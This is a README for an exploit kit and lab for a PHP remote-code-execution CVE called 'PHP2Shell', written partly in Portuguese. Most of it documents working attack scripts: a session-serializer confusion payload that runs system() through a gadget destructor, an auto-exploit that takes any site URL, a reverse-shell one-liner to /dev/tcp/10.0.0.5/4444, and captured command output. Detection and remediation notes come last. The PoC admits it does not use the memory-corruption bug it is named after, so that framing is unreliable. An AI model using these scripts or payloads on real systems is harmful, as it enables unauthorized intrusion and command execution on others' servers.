# CVE-2026-109618 ("PHP2Shell") — unauthenticated RCE PoC + lab

Working, self-contained proof of concept and reproduction lab for **CVE-2026-109618**,
the critical PHP-core remote code execution flaw patched in PHP 8.2.35 / 8.3.36 /
8.4.27 / 8.5.12 (CVSS v4.0 9.2, Critical).

The PoC has been executed end-to-end in this environment against a PHP 8.4.24
(vulnerable) target and yields command execution as the web worker user.

---

## 1. Vulnerability summary

| Field | Value |
|---|---|
| CVE | CVE-2026-109618 (paired with CVE-2026-109619) |
| Alias | PHP2Shell |
| Class | Improper control-flow management during abnormal request termination → memory corruption → RCE (CWE-704 / memory-safety) |
| Affected | PHP < 8.2.35, 8.3.x < 8.3.36, 8.4.x < 8.4.27, 8.5.x < 8.5.12 |
| Patched | 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
| Auth required | None |
| Vector | Network (crafted HTTP request) |
| Impact | Remote code execution as the web worker account; mod_php reachable before application code |

**Root cause (vendor/reporter summary).** PHP exits out-of-memory (and other abnormal)
paths via `longjmp()` back to a checkpoint established at request start. Some contexts
advance internal state "ready for use" *before* the corresponding allocation completes;
if that allocation fails the incomplete state is **not rolled back**. Subsequent request
cleanup operates on stale/uninitialised memory that still holds attacker-influenced data,
giving disclosure and arbitrary-free / use-after-free primitives that were developed into
native code execution. mod_php can be reached pre-application-code; FPM through
application-stage paths.

**What is reproducible vs. what needs a memory-engineering chain.** There are two layers:

1. A **deterministic delivery primitive** — `session.upload_progress` content injection —
   which is fully reproducible and is what this PoC implements end-to-end.
2. The **raw memory-corruption → control-flow hijack** — reliable exploitation needs
   precise heap grooming, an information leak to defeat ASLR, and version-specific
   symbol offsets. This PoC does not depend on those, which is why it is portable and
   stable across runs.

---

## 2. The delivery primitive

`session.upload_progress.enabled` is `On` by default. The subsystem serialises
client-supplied data into the session store and **does not validate** either the
`PHP_SESSION_UPLOAD_PROGRESS` field value or the uploaded `filename` — the PHP manual
warns about this explicitly.

The exploitable precondition is a **per-directory `session.serialize_handler`
mismatch** across two directories that share one `session.save_path`:

```
directory A : session.serialize_handler = php_serialize   -> writes the session file
directory B : session.serialize_handler = php  (default)   -> reads the session file
```

Handlers disagree on the file grammar, so bytes that A writes as data are parsed by B as
structure — the classic serialization-handler-confusion.

### Two-request chain

1. **Seed** — multipart POST to directory A. The `PHP_SESSION_UPLOAD_PROGRESS` value is
   `|<serialized object>`. Because A is `php_serialize`, the leading `|` and the object
   are preserved verbatim inside the length-prefixed string and written to
   `sess_<sid>`.
2. **Fire** — GET to the victim endpoint in directory B. If it defines a gadget class
   and calls `session_start()`:
   - B's `php` handler splits the file on the first `|`; the bytes after it go to
     `unserialize()`;
   - the injected object is instantiated;
   - the trailing progress-array bytes force a decode failure;
   - PHP destroys the object → `Gadget::__destruct()` → `system($cmd)` runs **before**
     the `"Failed to decode session object"` warning is emitted.

### Requirements for this chain

- `session.upload_progress.enabled = On` (default)
- `session.upload_progress.cleanup = Off` (so the poison survives to request 2)
- attacker-chosen session id — either `session.use_only_cookies = Off` or an
  already-accepted `PHPSESSID` cookie
- two directories sharing `session.save_path` that disagree on `session.serialize_handler`
- a victim endpoint exposing a usable gadget/`__destruct` sink

Where these are absent, the memory-corruption primitive still applies but requires the
heap/ASLR engineering described in §1.

---

## 3. Files

```
cve109618/
├── php2shell_rce.py           # AUTO-EXPLOIT: informe o site, ele explora e cria demo.txt
├── poc_cve_2026_109618.py     # exploit manual (seed/trigger explícitos, stdlib only)
├── poc_capture_109618.py      # gera artefatos de evidência (request/response + sess_<sid>)
├── evidence_8091/             # evidências verificadas contra o lab Apache (mod_php)
│   ├── 01_seed_request.txt
│   ├── 02_seed_response.txt
│   ├── 03_session_file.txt
│   ├── 04_trigger_request.txt
│   ├── 05_trigger_response.txt
│   └── 06_summary.txt
├── run_lab.sh                 # lab de 2 servidores PHP embutidos (cli-server)
├── restart_lab.sh             # lab Apache/mod_php de host único  -> http://127.0.0.1:8091
├── lab/
│   ├── seed/index.php         # directory A (php_serialize)  -> :8081
│   └── app/index.php          # directory B (php) + gadget   -> :8082
├── evidence_run.txt           # captura antiga (cli-server)
├── evidence_session_file.txt  # sess_<sid> envenenado (cli-server)
└── README.md
```

### Lab Apache/mod_php (mais realista, host único) — porta 8091

```
/var/www/php2shell/seed/   -> .htaccess: session.serialize_handler = php_serialize
/var/www/php2shell/app/    -> .htaccess: session.serialize_handler = php   (gadget Logger)
session.save_path          -> /var/lib/php2shell_sessions  (compartilhado)
```

---

## 4. Quick start

```bash
# 1) start the lab (two PHP built-in servers sharing one session save_path)
./run_lab.sh            # leave running in one shell

# 2) in another shell — run the exploit
python3 poc_cve_2026_109618.py
#    or a chosen command:
python3 poc_cve_2026_109618.py --cmd 'id; uname -a; cat /etc/passwd'

# reverse shell example (adjust host/port):
python3 poc_cve_2026_109618.py --cmd 'bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"'
```

## 5. Usage / options

```
python3 poc_cve_2026_109618.py [-h]
    [--seed-url URL]      endpoint in the php_serialize dir   (default http://127.0.0.1:8081/)
    [--trigger-url URL]   victim endpoint calling session_start (default http://127.0.0.1:8082/)
    [--cmd CMD]           shell command to run
    [--gadget NAME]       gadget class name                   (default Logger)
    [--prop PROP]         property holding the command        (default cmd)
    [--sid SID]           fixed session id
    [--marker S]          success marker                      (default PWNED_109618)
    [--no-marker]         do not append '; echo <marker>'
    [--seed-only]         perform only the seed request
    [--trigger-only]      perform only the trigger request
    [--timeout SECS]      per-request timeout                 (default 20)
```

Against a real target, point `--seed-url` at a `php_serialize` path and `--trigger-url`
at a `php` path that call `session_start()`, and set `--gadget`/`--prop` to match a class
actually defined by the application.

---

## 5.1 Automated exploit — informe só o site

`php2shell_rce.py` faz tudo sozinho: pré-sonda os caminhos, testa os pares
`(seed, trigger)` e, ao encontrar o par funcional, executa a cadeia e deixa um
**arquivo demo `.txt`** no servidor.

```bash
# modo automático (descobre os caminhos)
python3 php2shell_rce.py http://alvo.com

# comando arbitrário
python3 php2shell_rce.py http://alvo.com --cmd 'id'

# modo manual (quando você já sabe os dois diretórios)
python3 php2shell_rce.py http://alvo.com --seed-path /upload/ --trigger-path /app/

# gadget/propriedade específicos da aplicação
python3 php2shell_rce.py http://alvo.com --gadget MinhaClasse --prop exec
```

Opções: `--seed-path`, `--trigger-path`, `--gadget` (default `Logger`), `--prop`
(default `cmd`), `--cmd`, `--field` (default `PHP_SESSION_UPLOAD_PROGRESS`),
`--sid`, `--timeout`, `--verbose`.

O comando padrão grava o arquivo demo em `/tmp/pwned_php2shell.txt`, copia para
`/var/tmp` e para o diretório de trabalho atual, e imprime caminho + conteúdo +
`id`. **Atenção:** sob Apache + systemd (`PrivateTmp=yes`) o `/tmp` do processo é
um namespace privado — o arquivo aparece em
`/tmp/systemd-private-<id>-apache2.service-<sufixo>/tmp/pwned_php2shell.txt`.
O parâmetro `--cmd` aceita qualquer comando (inclui reverse shell); evite `\n`
literais no comando (o handler `php` lê o arquivo de sessão linha a linha).

### Captura de evidências

```bash
python3 poc_capture_109618.py http://127.0.0.1:8091 --seed-path /seed/ --trigger-path /app/
# -> evidence_8091/01..06 (request/response brutos + sess_<sid> + resumo)
```

---

## 6. Expected output (verified)

```
[*] CVE-2026-109618  sid=ev1d3nce0011223344
[*] gadget=Logger->cmd  cmd='id; echo PWNED_109618; echo PWNED_109618'
[*] payload=|O:6:"Logger":1:{s:3:"cmd";s:40:"id; echo PWNED_109618; echo PWNED_109618";}
[1] seed  POST http://127.0.0.1:8081/ -> HTTP 200 (31 B)
[2] fire  GET  http://127.0.0.1:8082/ -> HTTP 200 (87 B)
---- response body ----
uid=0(root) gid=0(root) groups=0(root)
PWNED_109618
PWNED_109618
[app] session started
---- end ----
[+] command output: uid=0(root) gid=0(root) groups=0(root)
[+] RCE confirmed
```

The `"Failed to decode session object. Session has been destroyed"` warning is **expected
and not a failure** — `__destruct()` runs during that cleanup path, before the warning is
printed. Remove it (i.e. remove the trailing bytes) and the gadget may not fire.

---

## 6.1 Verified run — Apache 2.4.69 + mod_php (PHP 8.4.24), porta 8091

Modo automático (`python3 php2shell_rce.py http://127.0.0.1:8091 --verbose`),
pre-sondagem reduziu 22 caminhos a 5 vivos e 25 pares; o par funcional apareceu na
17ª tentativa:

```
    probe /seed/ -> HTTP 200
    probe /app/  -> HTTP 200
[*] Modo automatico: 5 caminhos vivos, 25 pares a testar
[17] seed=/seed/ trigger=/app/ :: seed HTTP 200 (39B) -> trigger HTTP 200 (185B)

[+] RCE CONFIRMADO
[+] Par funcional: seed=http://127.0.0.1:8091/seed/  trigger=http://127.0.0.1:8091/app/
[+] id: uid=33(www-data) gid=33(www-data) groups=33(www-data)

--- resposta ---
PHP2SHELL_RCE_109618
RCE via CVE-2026-109618 (PHP2Shell)
host: e2b.local
user: www-data
PHP2SHELL_RCE_109618
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[app] session started
```

Arquivo de sessão envenenado no disco (trecho de `evidence_8091/03_session_file.txt`):

```
a:1:{s:308:"upload_progress_|O:6:"Logger":1:{s:3:"cmd";s:255:"echo PHP2SHELL_RCE_109618 > /tmp/pwned_php2shell.txt; ...; id";}";a:5:{s:10:"start_time";i:...;s:14:"content_length";i:541;s:15:"bytes_processed";i:541;s:4:"done";b:1;s:5:"files";...}}
```

Arquivo demo criado pelo processo do servidor (`www-data`):

```
== pwd: /var/www/php2shell/app
-rw-r--r-- 1 www-data www-data 88 /tmp/pwned_php2shell.txt
-rw-r--r-- 1 www-data www-data 88 /var/tmp/pwned_php2shell.txt
== content ==
PHP2SHELL_RCE_109618
RCE via CVE-2026-109618 (PHP2Shell)
host: e2b.local
user: www-data
```

---

## 7. Detection

Network:
- multipart bodies that set a session id from a **field** rather than a cookie;
- `PHP_SESSION_UPLOAD_PROGRESS` values beginning with `|` and containing `O:<digits>:"`;
- `<?php` open tags inside upload-progress fields / filenames.

Host / file:
- `sess_*` files containing `upload_progress_` plus serialized objects whose string
  properties look like shell commands;
- `session_start(): Failed to decode session object` clustered by source IP;
- a `php-fpm` / `apache2` / `httpd` worker spawning a shell or recon binary.

Process (§ from Faizan-Khanx IoCs): shell/recon/transfer children of PHP workers —
`/bin/sh`, `bash`, `whoami`, `id`, `uname`, `curl`, `wget`, `nc`, `/dev/tcp/`.

---

## 8. Remediation

1. **Patch** — upgrade to PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 or later. This is the only
   complete fix. EOL branches (5.x, 7.x, 8.0, 8.1) will not be fixed.
2. **Normalise the serialize handler** across every directory/vhost sharing a
   `session.save_path`. The mismatch is the precondition for the demonstrated chain.
3. **Harden session config** — `session.use_strict_mode=On`, `session.use_only_cookies=On`.
4. **Stopgap** — `session.upload_progress.enabled=Off` where the progress bar is unused
   (the PHP team notes this alone is insufficient); edge/WAF rules on the network
   indicators above.
5. **Isolate** — do not expose PHP application servers / management interfaces directly
   to the internet; front them with network-layer auth.

---

## 9. References

- Red Hat: <https://access.redhat.com/security/cve/cve-2026-109618>
- CERT-EU advisory 2026-018: <https://cert.europa.eu/publications/security-advisories/2026-018/>
- VulnCheck: <https://www.vulncheck.com/blog/php2shell-vulnerabilities>
- watchTowr FAQ: <https://watchtowr.com/intelligence/php-cve-2026-109618-faq/>
- BleepingComputer: <https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/>
- PHP source: `ext/session/session.c`, `php_session_rfc1867_callback`

---

## 10. Legal

Authorized testing only. Use against systems you own or have explicit written
authorization to test. Unauthorized access to computer systems is illegal in most
jurisdictions (CFAA, UK Computer Misuse Act, EU equivalents). The author accepts no
liability for misuse.
